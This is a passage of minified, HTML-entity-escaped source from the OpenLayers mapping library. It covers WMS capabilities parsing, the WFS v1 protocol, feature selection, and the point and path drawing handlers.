c=&#123;&#125;;b.styles.push(c);this.readChildNodes(a,c)&#125;,LegendURL:function(a,b)&#123;var c=&#123;width:a.getAttribute("width"),height:a.getAttribute("height")&#125;;b.legend=c;this.readChildNodes(a,c)&#125;,MetadataURL:function(a,b)&#123;var c=&#123;type:a.getAttribute("type")&#125;;b.metadataURLs.push(c);this.readChildNodes(a,c)&#125;,DataURL:function(a,b)&#123;b.dataURL=&#123;&#125;;this.readChildNodes(a,b.dataURL)&#125;,FeatureListURL:function(a,b)&#123;b.featureListURL=&#123;&#125;;this.readChildNodes(a,b.featureListURL)&#125;,AuthorityURL:function(a,b)&#123;var c=a.getAttribute("name"),d=&#123;&#125;;this.readChildNodes(a,d);b.authorityURLs[c]=d.href&#125;,Identifier:function(a,b)&#123;var c=a.getAttribute("authority");b.identifiers[c]=this.getChildValue(a)&#125;,KeywordList:function(a,b)&#123;this.readChildNodes(a,b)&#125;,SRS:function(a,b)&#123;b.srs[this.getChildValue(a)]=!0&#125;&#125;&#125;,CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1"&#125;);OpenLayers.Format.WMSCapabilities.v1_1=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1,&#123;readers:&#123;wms:OpenLayers.Util.applyDefaults(&#123;WMT_MS_Capabilities:function(a,b)&#123;this.readChildNodes(a,b)&#125;,Keyword:function(a,b)&#123;b.keywords&amp;&amp;b.keywords.push(this.getChildValue(a))&#125;,DescribeLayer:function(a,b)&#123;b.describelayer=&#123;formats:[]&#125;;this.readChildNodes(a,b.describelayer)&#125;,GetLegendGraphic:function(a,b)&#123;b.getlegendgraphic=&#123;formats:[]&#125;;this.readChildNodes(a,b.getlegendgraphic)&#125;,GetStyles:function(a,b)&#123;b.getstyles=&#123;formats:[]&#125;;this.readChildNodes(a,b.getstyles)&#125;,PutStyles:function(a,b)&#123;b.putstyles=&#123;formats:[]&#125;;this.readChildNodes(a,b.putstyles)&#125;,UserDefinedSymbolization:function(a,b)&#123;var c=&#123;supportSLD:1==parseInt(a.getAttribute("SupportSLD")),userLayer:1==parseInt(a.getAttribute("UserLayer")),userStyle:1==parseInt(a.getAttribute("UserStyle")),remoteWFS:1==parseInt(a.getAttribute("RemoteWFS"))&#125;;b.userSymbols=c&#125;,LatLonBoundingBox:function(a,b)&#123;b.llbbox=[parseFloat(a.getAttribute("minx")),parseFloat(a.getAttribute("miny")),parseFloat(a.getAttribute("maxx")),parseFloat(a.getAttribute("maxy"))]&#125;,BoundingBox:function(a,b)&#123;var c=OpenLayers.Format.WMSCapabilities.v1.prototype.readers.wms.BoundingBox.apply(this,[a,b]);c.srs=a.getAttribute("SRS");b.bbox[c.srs]=c&#125;,ScaleHint:function(a,b)&#123;var c=a.getAttribute("min"),d=a.getAttribute("max"),e=Math.pow(2,0.5),f=OpenLayers.INCHES_PER_UNIT.m;0!=c&amp;&amp;(b.maxScale=parseFloat((c/e*f*OpenLayers.DOTS_PER_INCH).toPrecision(13)));d!=Number.POSITIVE_INFINITY&amp;&amp;(b.minScale=parseFloat((d/e*f*OpenLayers.DOTS_PER_INCH).toPrecision(13)))&#125;,Dimension:function(a,b)&#123;var c=&#123;name:a.getAttribute("name").toLowerCase(),units:a.getAttribute("units"),unitsymbol:a.getAttribute("unitSymbol")&#125;;b.dimensions[c.name]=c&#125;,Extent:function(a,b)&#123;var c=a.getAttribute("name").toLowerCase();if(c in b.dimensions)&#123;c=b.dimensions[c];c.nearestVal="1"===a.getAttribute("nearestValue");c.multipleVal="1"===a.getAttribute("multipleValues");c.current="1"===a.getAttribute("current");c["default"]=a.getAttribute("default")||"";var d=this.getChildValue(a);c.values=d.split(",")&#125;&#125;&#125;,OpenLayers.Format.WMSCapabilities.v1.prototype.readers.wms)&#125;,CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1_1"&#125;);OpenLayers.Format.WMSCapabilities.v1_1_0=OpenLayers.Class(OpenLayers.Format.WMSCapabilities.v1_1,&#123;version:"1.1.0",readers:&#123;wms:OpenLayers.Util.applyDefaults(&#123;SRS:function(a,b)&#123;for(var c=this.getChildValue(a).split(/ +/),d=0,e=c.length;d&lt;e;d++)b.srs[c[d]]=!0&#125;&#125;,OpenLayers.Format.WMSCapabilities.v1_1.prototype.readers.wms)&#125;,CLASS_NAME:"OpenLayers.Format.WMSCapabilities.v1_1_0"&#125;);OpenLayers.Protocol.WFS.v1=OpenLayers.Class(OpenLayers.Protocol,&#123;version:null,srsName:"EPSG:4326",featureType:null,featureNS:null,geometryName:"the_geom",schema:null,featurePrefix:"feature",formatOptions:null,readFormat:null,readOptions:null,initialize:function(a)&#123;OpenLayers.Protocol.prototype.initialize.apply(this,[a]);a.format||(this.format=OpenLayers.Format.WFST(OpenLayers.Util.extend(&#123;version:this.version,featureType:this.featureType,featureNS:this.featureNS,featurePrefix:this.featurePrefix,geometryName:this.geometryName,srsName:this.srsName,schema:this.schema&#125;,this.formatOptions)));!a.geometryName&amp;&amp;1&lt;parseFloat(this.format.version)&amp;&amp;this.setGeometryName(null)&#125;,destroy:function()&#123;this.options&amp;&amp;!this.options.format&amp;&amp;this.format.destroy();this.format=null;OpenLayers.Protocol.prototype.destroy.apply(this)&#125;,read:function(a)&#123;OpenLayers.Protocol.prototype.read.apply(this,arguments);a=OpenLayers.Util.extend(&#123;&#125;,a);OpenLayers.Util.applyDefaults(a,this.options||&#123;&#125;);var b=new OpenLayers.Protocol.Response(&#123;requestType:"read"&#125;),c=OpenLayers.Format.XML.prototype.write.apply(this.format,[this.format.writeNode("wfs:GetFeature",a)]);b.priv=OpenLayers.Request.POST(&#123;url:a.url,callback:this.createCallback(this.handleRead,b,a),params:a.params,headers:a.headers,data:c&#125;);return b&#125;,setFeatureType:function(a)&#123;this.featureType=a;this.format.featureType=a&#125;,setGeometryName:function(a)&#123;this.geometryName=a;this.format.geometryName=a&#125;,handleRead:function(a,b)&#123;b=OpenLayers.Util.extend(&#123;&#125;,b);OpenLayers.Util.applyDefaults(b,this.options);if(b.callback)&#123;var c=a.priv;200&lt;=c.status&amp;&amp;300&gt;c.status?(c=this.parseResponse(c,b.readOptions))&amp;&amp;!1!==c.success?(b.readOptions&amp;&amp;"object"==b.readOptions.output?OpenLayers.Util.extend(a,c):a.features=c,a.code=OpenLayers.Protocol.Response.SUCCESS):(a.code=OpenLayers.Protocol.Response.FAILURE,a.error=c):a.code=OpenLayers.Protocol.Response.FAILURE;b.callback.call(b.scope,a)&#125;&#125;,parseResponse:function(a,b)&#123;var c=a.responseXML;c&amp;&amp;c.documentElement||(c=a.responseText);if(!c||0&gt;=c.length)return null;c=null!==this.readFormat?this.readFormat.read(c):this.format.read(c,b);if(!this.featureNS)&#123;var d=this.readFormat||this.format;this.featureNS=d.featureNS;d.autoConfig=!1;this.geometryName||this.setGeometryName(d.geometryName)&#125;return c&#125;,commit:function(a,b)&#123;b=OpenLayers.Util.extend(&#123;&#125;,b);OpenLayers.Util.applyDefaults(b,this.options);var c=new OpenLayers.Protocol.Response(&#123;requestType:"commit",reqFeatures:a&#125;);c.priv=OpenLayers.Request.POST(&#123;url:b.url,headers:b.headers,data:this.format.write(a,b),callback:this.createCallback(this.handleCommit,c,b)&#125;);return c&#125;,handleCommit:function(a,b)&#123;if(b.callback)&#123;var c=a.priv,d=c.responseXML;d&amp;&amp;d.documentElement||(d=c.responseText);c=this.format.read(d)||&#123;&#125;;a.insertIds=c.insertIds||[];c.success?a.code=OpenLayers.Protocol.Response.SUCCESS:(a.code=OpenLayers.Protocol.Response.FAILURE,a.error=c);b.callback.call(b.scope,a)&#125;&#125;,filterDelete:function(a,b)&#123;b=OpenLayers.Util.extend(&#123;&#125;,b);OpenLayers.Util.applyDefaults(b,this.options);new OpenLayers.Protocol.Response(&#123;requestType:"commit"&#125;);var c=this.format.createElementNSPlus("wfs:Transaction",&#123;attributes:&#123;service:"WFS",version:this.version&#125;&#125;),d=this.format.createElementNSPlus("wfs:Delete",&#123;attributes:&#123;typeName:(b.featureNS?this.featurePrefix+":":"")+b.featureType&#125;&#125;);b.featureNS&amp;&amp;d.setAttribute("xmlns:"+this.featurePrefix,b.featureNS);var e=this.format.writeNode("ogc:Filter",a);d.appendChild(e);c.appendChild(d);c=OpenLayers.Format.XML.prototype.write.apply(this.format,[c]);return OpenLayers.Request.POST(&#123;url:this.url,callback:b.callback||function()&#123;&#125;,data:c&#125;)&#125;,abort:function(a)&#123;a&amp;&amp;a.priv.abort()&#125;,CLASS_NAME:"OpenLayers.Protocol.WFS.v1"&#125;);OpenLayers.Handler.Feature=OpenLayers.Class(OpenLayers.Handler,&#123;EVENTMAP:&#123;click:&#123;"in":"click",out:"clickout"&#125;,mousemove:&#123;"in":"over",out:"out"&#125;,dblclick:&#123;"in":"dblclick",out:null&#125;,mousedown:&#123;"in":null,out:null&#125;,mouseup:&#123;"in":null,out:null&#125;,touchstart:&#123;"in":"click",out:"clickout"&#125;&#125;,feature:null,lastFeature:null,down:null,up:null,clickTolerance:4,geometryTypes:null,stopClick:!0,stopDown:!0,stopUp:!1,initialize:function(a,b,c,d)&#123;OpenLayers.Handler.prototype.initialize.apply(this,[a,c,d]);this.layer=b&#125;,touchstart:function(a)&#123;this.startTouch();return OpenLayers.Event.isMultiTouch(a)?!0:this.mousedown(a)&#125;,touchmove:function(a)&#123;OpenLayers.Event.preventDefault(a)&#125;,mousedown:function(a)&#123;if(OpenLayers.Event.isLeftClick(a)||OpenLayers.Event.isSingleTouch(a))this.down=a.xy;return this.handle(a)?!this.stopDown:!0&#125;,mouseup:function(a)&#123;this.up=a.xy;return this.handle(a)?!this.stopUp:!0&#125;,click:function(a)&#123;return this.handle(a)?!this.stopClick:!0&#125;,mousemove:function(a)&#123;if(!this.callbacks.over&amp;&amp;!this.callbacks.out)return!0;this.handle(a);return!0&#125;,dblclick:function(a)&#123;return!this.handle(a)&#125;,geometryTypeMatches:function(a)&#123;return null==this.geometryTypes||-1&lt;OpenLayers.Util.indexOf(this.geometryTypes,a.geometry.CLASS_NAME)&#125;,handle:function(a)&#123;this.feature&amp;&amp;!this.feature.layer&amp;&amp;(this.feature=null);var b=a.type,c=!1,d=!!this.feature,e="click"==b||"dblclick"==b||"touchstart"==b;(this.feature=this.layer.getFeatureFromEvent(a))&amp;&amp;!this.feature.layer&amp;&amp;(this.feature=null);this.lastFeature&amp;&amp;!this.lastFeature.layer&amp;&amp;(this.lastFeature=null);this.feature?("touchstart"===b&amp;&amp;OpenLayers.Event.preventDefault(a),a=this.feature!=this.lastFeature,this.geometryTypeMatches(this.feature)?(d&amp;&amp;a?(this.lastFeature&amp;&amp;this.triggerCallback(b,"out",[this.lastFeature]),this.triggerCallback(b,"in",[this.feature])):d&amp;&amp;!e||this.triggerCallback(b,"in",[this.feature]),this.lastFeature=this.feature,c=!0):(this.lastFeature&amp;&amp;(d&amp;&amp;a||e)&amp;&amp;this.triggerCallback(b,"out",[this.lastFeature]),this.feature=null)):this.lastFeature&amp;&amp;(d||e)&amp;&amp;this.triggerCallback(b,"out",[this.lastFeature]);return c&#125;,triggerCallback:function(a,b,c)&#123;if(b=this.EVENTMAP[a][b])"click"==a&amp;&amp;this.up&amp;&amp;this.down?(Math.sqrt(Math.pow(this.up.x-this.down.x,2)+Math.pow(this.up.y-this.down.y,2))&lt;=this.clickTolerance&amp;&amp;this.callback(b,c),this.up=this.down=null):this.callback(b,c)&#125;,activate:function()&#123;var a=!1;OpenLayers.Handler.prototype.activate.apply(this,arguments)&amp;&amp;(this.moveLayerToTop(),this.map.events.on(&#123;removelayer:this.handleMapEvents,changelayer:this.handleMapEvents,scope:this&#125;),a=!0);return a&#125;,deactivate:function()&#123;var a=!1;OpenLayers.Handler.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.moveLayerBack(),this.up=this.down=this.lastFeature=this.feature=null,this.map.events.un(&#123;removelayer:this.handleMapEvents,changelayer:this.handleMapEvents,scope:this&#125;),a=!0);return a&#125;,handleMapEvents:function(a)&#123;"removelayer"!=a.type&amp;&amp;"order"!=a.property||this.moveLayerToTop()&#125;,moveLayerToTop:function()&#123;var a=Math.max(this.map.Z_INDEX_BASE.Feature-1,this.layer.getZIndex())+1;this.layer.setZIndex(a)&#125;,moveLayerBack:function()&#123;var a=this.layer.getZIndex()-1;a&gt;=this.map.Z_INDEX_BASE.Feature?this.layer.setZIndex(a):this.map.setLayerZIndex(this.layer,this.map.getLayerIndex(this.layer))&#125;,CLASS_NAME:"OpenLayers.Handler.Feature"&#125;);OpenLayers.Layer.Vector.RootContainer=OpenLayers.Class(OpenLayers.Layer.Vector,&#123;displayInLayerSwitcher:!1,layers:null,display:function()&#123;&#125;,getFeatureFromEvent:function(a)&#123;for(var b=this.layers,c,d=0;d&lt;b.length;d++)if(c=b[d].getFeatureFromEvent(a))return c&#125;,setMap:function(a)&#123;OpenLayers.Layer.Vector.prototype.setMap.apply(this,arguments);this.collectRoots();a.events.register("changelayer",this,this.handleChangeLayer)&#125;,removeMap:function(a)&#123;a.events.unregister("changelayer",this,this.handleChangeLayer);this.resetRoots();OpenLayers.Layer.Vector.prototype.removeMap.apply(this,arguments)&#125;,collectRoots:function()&#123;for(var a,b=0;b&lt;this.map.layers.length;++b)a=this.map.layers[b],-1!=OpenLayers.Util.indexOf(this.layers,a)&amp;&amp;a.renderer.moveRoot(this.renderer)&#125;,resetRoots:function()&#123;for(var a,b=0;b&lt;this.layers.length;++b)a=this.layers[b],this.renderer&amp;&amp;a.renderer.getRenderLayerId()==this.id&amp;&amp;this.renderer.moveRoot(a.renderer)&#125;,handleChangeLayer:function(a)&#123;var b=a.layer;"order"==a.property&amp;&amp;-1!=OpenLayers.Util.indexOf(this.layers,b)&amp;&amp;(this.resetRoots(),this.collectRoots())&#125;,CLASS_NAME:"OpenLayers.Layer.Vector.RootContainer"&#125;);OpenLayers.Control.SelectFeature=OpenLayers.Class(OpenLayers.Control,&#123;multipleKey:null,toggleKey:null,multiple:!1,clickout:!0,toggle:!1,hover:!1,highlightOnly:!1,box:!1,onBeforeSelect:function()&#123;&#125;,onSelect:function()&#123;&#125;,onUnselect:function()&#123;&#125;,scope:null,geometryTypes:null,layer:null,layers:null,callbacks:null,selectStyle:null,renderIntent:"select",handlers:null,initialize:function(a,b)&#123;OpenLayers.Control.prototype.initialize.apply(this,[b]);null===this.scope&amp;&amp;(this.scope=this);this.initLayer(a);var c=&#123;click:this.clickFeature,clickout:this.clickoutFeature&#125;;this.hover&amp;&amp;(c.over=this.overFeature,c.out=this.outFeature);this.callbacks=OpenLayers.Util.extend(c,this.callbacks);this.handlers=&#123;feature:new OpenLayers.Handler.Feature(this,this.layer,this.callbacks,&#123;geometryTypes:this.geometryTypes&#125;)&#125;;this.box&amp;&amp;(this.handlers.box=new OpenLayers.Handler.Box(this,&#123;done:this.selectBox&#125;,&#123;boxDivClassName:"olHandlerBoxSelectFeature"&#125;))&#125;,initLayer:function(a)&#123;OpenLayers.Util.isArray(a)?(this.layers=a,this.layer=new OpenLayers.Layer.Vector.RootContainer(this.id+"_container",&#123;layers:a&#125;)):this.layer=a&#125;,destroy:function()&#123;this.active&amp;&amp;this.layers&amp;&amp;this.map.removeLayer(this.layer);OpenLayers.Control.prototype.destroy.apply(this,arguments);this.layers&amp;&amp;this.layer.destroy()&#125;,activate:function()&#123;this.active||(this.layers&amp;&amp;this.map.addLayer(this.layer),this.handlers.feature.activate(),this.box&amp;&amp;this.handlers.box&amp;&amp;this.handlers.box.activate());return OpenLayers.Control.prototype.activate.apply(this,arguments)&#125;,deactivate:function()&#123;this.active&amp;&amp;(this.handlers.feature.deactivate(),this.handlers.box&amp;&amp;this.handlers.box.deactivate(),this.layers&amp;&amp;this.map.removeLayer(this.layer));return OpenLayers.Control.prototype.deactivate.apply(this,arguments)&#125;,unselectAll:function(a)&#123;var b=this.layers||[this.layer],c,d,e,f;for(e=0;e&lt;b.length;++e)if(c=b[e],f=0,null!=c.selectedFeatures)for(;c.selectedFeatures.length&gt;f;)d=c.selectedFeatures[f],a&amp;&amp;a.except==d?++f:this.unselect(d)&#125;,clickFeature:function(a)&#123;this.hover||(-1&lt;OpenLayers.Util.indexOf(a.layer.selectedFeatures,a)?this.toggleSelect()?this.unselect(a):this.multipleSelect()||this.unselectAll(&#123;except:a&#125;):(this.multipleSelect()||this.unselectAll(&#123;except:a&#125;),this.select(a)))&#125;,multipleSelect:function()&#123;return this.multiple||this.handlers.feature.evt&amp;&amp;this.handlers.feature.evt[this.multipleKey]&#125;,toggleSelect:function()&#123;return this.toggle||this.handlers.feature.evt&amp;&amp;this.handlers.feature.evt[this.toggleKey]&#125;,clickoutFeature:function(a)&#123;!this.hover&amp;&amp;this.clickout&amp;&amp;this.unselectAll()&#125;,overFeature:function(a)&#123;var b=a.layer;this.hover&amp;&amp;(this.highlightOnly?this.highlight(a):-1==OpenLayers.Util.indexOf(b.selectedFeatures,a)&amp;&amp;this.select(a))&#125;,outFeature:function(a)&#123;if(this.hover)if(this.highlightOnly)&#123;if(a._lastHighlighter==this.id)if(a._prevHighlighter&amp;&amp;a._prevHighlighter!=this.id)&#123;delete a._lastHighlighter;var b=this.map.getControl(a._prevHighlighter);b&amp;&amp;b.highlight(a)&#125;else this.unhighlight(a)&#125;else this.unselect(a)&#125;,highlight:function(a)&#123;var b=a.layer;!1!==this.events.triggerEvent("beforefeaturehighlighted",&#123;feature:a&#125;)&amp;&amp;(a._prevHighlighter=a._lastHighlighter,a._lastHighlighter=this.id,b.drawFeature(a,this.selectStyle||this.renderIntent),this.events.triggerEvent("featurehighlighted",&#123;feature:a&#125;))&#125;,unhighlight:function(a)&#123;var b=a.layer;void 0==a._prevHighlighter?delete a._lastHighlighter:(a._prevHighlighter!=this.id&amp;&amp;(a._lastHighlighter=a._prevHighlighter),delete a._prevHighlighter);b.drawFeature(a,a.style||a.layer.style||"default");this.events.triggerEvent("featureunhighlighted",&#123;feature:a&#125;)&#125;,select:function(a)&#123;var b=this.onBeforeSelect.call(this.scope,a),c=a.layer;!1!==b&amp;&amp;(b=c.events.triggerEvent("beforefeatureselected",&#123;feature:a&#125;),!1!==b&amp;&amp;(c.selectedFeatures.push(a),this.highlight(a),this.handlers.feature.lastFeature||(this.handlers.feature.lastFeature=c.selectedFeatures[0]),c.events.triggerEvent("featureselected",&#123;feature:a&#125;),this.onSelect.call(this.scope,a)))&#125;,unselect:function(a)&#123;var b=a.layer;this.unhighlight(a);OpenLayers.Util.removeItem(b.selectedFeatures,a);b.events.triggerEvent("featureunselected",&#123;feature:a&#125;);this.onUnselect.call(this.scope,a)&#125;,selectBox:function(a)&#123;if(a instanceof OpenLayers.Bounds)&#123;var b=this.map.getLonLatFromPixel(&#123;x:a.left,y:a.bottom&#125;);a=this.map.getLonLatFromPixel(&#123;x:a.right,y:a.top&#125;);b=new OpenLayers.Bounds(b.lon,b.lat,a.lon,a.lat);this.multipleSelect()||this.unselectAll();a=this.multiple;this.multiple=!0;var c=this.layers||[this.layer];this.events.triggerEvent("boxselectionstart",&#123;layers:c&#125;);for(var d,e=0;e&lt;c.length;++e)&#123;d=c[e];for(var f=0,g=d.features.length;f&lt;g;++f)&#123;var h=d.features[f];h.getVisibility()&amp;&amp;(null==this.geometryTypes||-1&lt;OpenLayers.Util.indexOf(this.geometryTypes,h.geometry.CLASS_NAME))&amp;&amp;b.toGeometry().intersects(h.geometry)&amp;&amp;-1==OpenLayers.Util.indexOf(d.selectedFeatures,h)&amp;&amp;this.select(h)&#125;&#125;this.multiple=a;this.events.triggerEvent("boxselectionend",&#123;layers:c&#125;)&#125;&#125;,setMap:function(a)&#123;this.handlers.feature.setMap(a);this.box&amp;&amp;this.handlers.box.setMap(a);OpenLayers.Control.prototype.setMap.apply(this,arguments)&#125;,setLayer:function(a)&#123;var b=this.active;this.unselectAll();this.deactivate();this.layers&amp;&amp;(this.layer.destroy(),this.layers=null);this.initLayer(a);this.handlers.feature.layer=this.layer;b&amp;&amp;this.activate()&#125;,CLASS_NAME:"OpenLayers.Control.SelectFeature"&#125;);OpenLayers.Handler.Point=OpenLayers.Class(OpenLayers.Handler,&#123;point:null,layer:null,multi:!1,citeCompliant:!1,mouseDown:!1,stoppedDown:null,lastDown:null,lastUp:null,persist:!1,stopDown:!1,stopUp:!1,layerOptions:null,pixelTolerance:5,lastTouchPx:null,initialize:function(a,b,c)&#123;c&amp;&amp;c.layerOptions&amp;&amp;c.layerOptions.styleMap||(this.style=OpenLayers.Util.extend(OpenLayers.Feature.Vector.style["default"],&#123;&#125;));OpenLayers.Handler.prototype.initialize.apply(this,arguments)&#125;,activate:function()&#123;if(!OpenLayers.Handler.prototype.activate.apply(this,arguments))return!1;var a=OpenLayers.Util.extend(&#123;displayInLayerSwitcher:!1,calculateInRange:OpenLayers.Function.True,wrapDateLine:this.citeCompliant&#125;,this.layerOptions);this.layer=new OpenLayers.Layer.Vector(this.CLASS_NAME,a);this.map.addLayer(this.layer);return!0&#125;,createFeature:function(a)&#123;a=this.layer.getLonLatFromViewPortPx(a);a=new OpenLayers.Geometry.Point(a.lon,a.lat);this.point=new OpenLayers.Feature.Vector(a);this.callback("create",[this.point.geometry,this.point]);this.point.geometry.clearBounds();this.layer.addFeatures([this.point],&#123;silent:!0&#125;)&#125;,deactivate:function()&#123;if(!OpenLayers.Handler.prototype.deactivate.apply(this,arguments))return!1;this.cancel();null!=this.layer.map&amp;&amp;(this.destroyFeature(!0),this.layer.destroy(!1));this.layer=null;return!0&#125;,destroyFeature:function(a)&#123;!this.layer||!a&amp;&amp;this.persist||this.layer.destroyFeatures();this.point=null&#125;,destroyPersistedFeature:function()&#123;var a=this.layer;a&amp;&amp;1&lt;a.features.length&amp;&amp;this.layer.features[0].destroy()&#125;,finalize:function(a)&#123;this.mouseDown=!1;this.lastTouchPx=this.lastUp=this.lastDown=null;this.callback(a?"cancel":"done",[this.geometryClone()]);this.destroyFeature(a)&#125;,cancel:function()&#123;this.finalize(!0)&#125;,click:function(a)&#123;OpenLayers.Event.stop(a);return!1&#125;,dblclick:function(a)&#123;OpenLayers.Event.stop(a);return!1&#125;,modifyFeature:function(a)&#123;this.point||this.createFeature(a);a=this.layer.getLonLatFromViewPortPx(a);this.point.geometry.x=a.lon;this.point.geometry.y=a.lat;this.callback("modify",[this.point.geometry,this.point,!1]);this.point.geometry.clearBounds();this.drawFeature()&#125;,drawFeature:function()&#123;this.layer.drawFeature(this.point,this.style)&#125;,getGeometry:function()&#123;var a=this.point&amp;&amp;this.point.geometry;a&amp;&amp;this.multi&amp;&amp;(a=new OpenLayers.Geometry.MultiPoint([a]));return a&#125;,geometryClone:function()&#123;var a=this.getGeometry();return a&amp;&amp;a.clone()&#125;,mousedown:function(a)&#123;return this.down(a)&#125;,touchstart:function(a)&#123;this.startTouch();this.lastTouchPx=a.xy;return this.down(a)&#125;,mousemove:function(a)&#123;return this.move(a)&#125;,touchmove:function(a)&#123;this.lastTouchPx=a.xy;return this.move(a)&#125;,mouseup:function(a)&#123;return this.up(a)&#125;,touchend:function(a)&#123;a.xy=this.lastTouchPx;return this.up(a)&#125;,down:function(a)&#123;this.mouseDown=!0;this.lastDown=a.xy;this.touch||this.modifyFeature(a.xy);this.stoppedDown=this.stopDown;return!this.stopDown&#125;,move:function(a)&#123;this.touch||this.mouseDown&amp;&amp;!this.stoppedDown||this.modifyFeature(a.xy);return!0&#125;,up:function(a)&#123;this.mouseDown=!1;this.stoppedDown=this.stopDown;if(!this.checkModifiers(a)||this.lastUp&amp;&amp;this.lastUp.equals(a.xy)||!this.lastDown||!this.passesTolerance(this.lastDown,a.xy,this.pixelTolerance))return!0;this.touch&amp;&amp;this.modifyFeature(a.xy);this.persist&amp;&amp;this.destroyPersistedFeature();this.lastUp=a.xy;this.finalize();return!this.stopUp&#125;,mouseout:function(a)&#123;OpenLayers.Util.mouseLeft(a,this.map.viewPortDiv)&amp;&amp;(this.stoppedDown=this.stopDown,this.mouseDown=!1)&#125;,passesTolerance:function(a,b,c)&#123;var d=!0;null!=c&amp;&amp;a&amp;&amp;b&amp;&amp;a.distanceTo(b)&gt;c&amp;&amp;(d=!1);return d&#125;,CLASS_NAME:"OpenLayers.Handler.Point"&#125;);OpenLayers.Handler.Path=OpenLayers.Class(OpenLayers.Handler.Point,&#123;line:null,maxVertices:null,doubleTouchTolerance:20,freehand:!1,freehandToggle:"shiftKey",timerId:null,redoStack:null,createFeature:function(a)&#123;a=this.layer.getLonLatFromViewPortPx(a);a=new OpenLayers.Geometry.Point(a.lon,a.lat);this.point=new OpenLayers.Feature.Vector(a);this.line=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.LineString([this.point.geometry]));this.callback("create",[this.point.geometry,this.getSketch()]);this.point.geometry.clearBounds();this.layer.addFeatures([this.line,this.point],&#123;silent:!0&#125;)&#125;,destroyFeature:function(a)&#123;OpenLayers.Handler.Point.prototype.destroyFeature.call(this,a);this.line=null&#125;,destroyPersistedFeature:function()&#123;var a=this.layer;a&amp;&amp;2&lt;a.features.length&amp;&amp;this.layer.features[0].destroy()&#125;,removePoint:function()&#123;this.point&amp;&amp;this.layer.removeFeatures([this.point])&#125;,addPoint:function(a)&#123;this.layer.removeFeatures([this.point]);a=this.layer.getLonLatFromViewPortPx(a);this.point=new OpenLayers.Feature.Vector(new OpenLayers.Geometry.Point(a.lon,a.lat));this.line.geometry.addComponent(this.point.geometry,this.line.geometry.components.length);this.layer.addFeatures([this.point]);this.callback("point",[this.point.geometry,this.getGeometry()]);this.callback("modify",[this.point.geometry,this.getSketch()]);this.drawFeature();delete this.redoStack&#125;,insertXY:function(a,b)&#123;this.line.geometry.addComponent(new OpenLayers.Geometry.Point(a,b),this.getCurrentPointIndex());this.drawFeature();delete this.redoStack&#125;,insertDeltaXY:function(a,b)&#123;var c=this.getCurrentPointIndex()-1,c=this.line.geometry.components[c];!c||(isNaN(c.x)||isNaN(c.y))||this.insertXY(c.x+a,c.y+b)&#125;,insertDirectionLength:function(a,b)&#123;a*=Math.PI/180;var c=b*Math.cos(a),d=b*Math.sin(a);this.insertDeltaXY(c,d)&#125;,insertDeflectionLength:function(a,b)&#123;var c=this.getCurrentPointIndex()-1;if(0&lt;c)&#123;var d=this.line.geometry.components[c],c=this.line.geometry.components[c-1],d=Math.atan2(d.y-c.y,d.x-c.x);this.insertDirectionLength(180*d/Math.PI+a,b)&#125;&#125;,getCurrentPointIndex:function()&#123;return this.line.geometry.components.length-1&#125;,undo:function()&#123;var a=this.line.geometry,b=a.components,c=this.getCurrentPointIndex()-1,d=b[c],e=a.removeComponent(d);e&amp;&amp;(this.touch&amp;&amp;0&lt;c&amp;&amp;(b=a.components,a=b[c-1],c=this.getCurrentPointIndex(),b=b[c],b.x=a.x,b.y=a.y),this.redoStack||(this.redoStack=[]),this.redoStack.push(d),this.drawFeature());return e&#125;,redo:function()&#123;var a=this.redoStack&amp;&amp;this.redoStack.pop();a&amp;&amp;(this.line.geometry.addComponent(a,this.getCurrentPointIndex()),this.drawFeature());return!!a&#125;,freehandMode:function(a)&#123;return this.freehandToggle&amp;&amp;a[this.freehandToggle]?!this.freehand:this.freehand&#125;,modifyFeature:function(a,b)&#123;this.line||this.createFeature(a);var c=this.layer.getLonLatFromViewPortPx(a);this.point.geometry.x=c.lon;this.point.geometry.y=c.lat;this.callback("modify",[this.point.geometry,this.getSketch(),b]);this.point.geometry.clearBounds();this.drawFeature()&#125;,drawFeature:function()&#123;this.layer.drawFeature(this.line,this.style);this.layer.drawFeature(this.point,this.style)&#125;,getSketch:function()&#123;return this.line&#125;,getGeometry:function()&#123;var a=this.line&amp;&amp;this.line.geometry;a&amp;&amp;this.multi&amp;&amp;(a=new OpenLayers.Geometry.MultiLineString([a]));return a&#125;,touchstart:function(a)&#123;if(this.timerId&amp;&amp;this.passesTolerance(this.lastTouchPx,a.xy,this.doubleTouchTolerance))return this.finishGeometry(),window.clearTimeout(this.timerId),this.timerId=null,!1;this.timerId&amp;&amp;(window.clearTimeout(this.timerId),this.timerId=null);this.timerId=window.setTimeout(OpenLayers.Function.bind(function()&#123;this.timerId=null&#125;,this),300);return OpenLayers.Handler.Point.prototype.touchstart.call(this,a)&#125;,down:function(a)&#123;var b=this.stopDown;this.freehandMode(a)&amp;&amp;(b=!0,this.touch&amp;&amp;(this.modifyFeature(a.xy,!!this.lastUp),OpenLayers.Event.stop(a)));this.touch||this.lastDown&amp;&amp;this.passesTolerance(this.lastDown,a.xy,this.pixelTolerance)||this.modifyFeature(a.xy,!!this.lastUp);this.mouseDown=!0;this.lastDown=a.xy;this.stoppedDown=b;return!b&#125;,move:function(a)&#123;if(this.stoppedDown&amp;&amp;this.freehandMode(a))return this.persist&amp;&amp;this.destroyPersistedFeature(),this.maxVertices&amp;&amp;this.line&amp;&amp;this.line.geometry.components.length===this.maxVertices?(this.removePoint(),this.finalize()):this.addPoint(a.xy),!1;this.touch||this.mouseDown&amp;&amp;!this.stoppedDown||this.modifyFeature(a.xy,!!this.lastUp);return!0&#125;,up:function(a)&#123;!this.mouseDown||this.lastUp&amp;&amp;this.lastUp.equals(a.xy)||(this.stoppedDown&amp;&amp;this.freehandMode(a)?(this.persist&amp;&amp;this.destroyPersistedFeature(),this.removePoint(),this.finalize()):this.passesTolerance(this.lastDown,a.xy,this.pixelTolerance)&amp;&amp;(this.touch&amp;&amp;this.modifyFeature(a.xy),null==this.lastUp&amp;&amp;this.persist&amp;&amp;this.destroyPersistedFeature(),this.addPoint(a.xy),this.lastUp=a.xy,this.line.geometry.components.length===this.maxVertices+1&amp;&amp;this.finishGeometry()));this.stoppedDown=this.stopDown;this.mouseDown=!1;return!this.stopUp&#125;,finishGeometry:function()&#123;this.line.geometry.removeComponent(this.line.geometry.components[this.line.geometry.components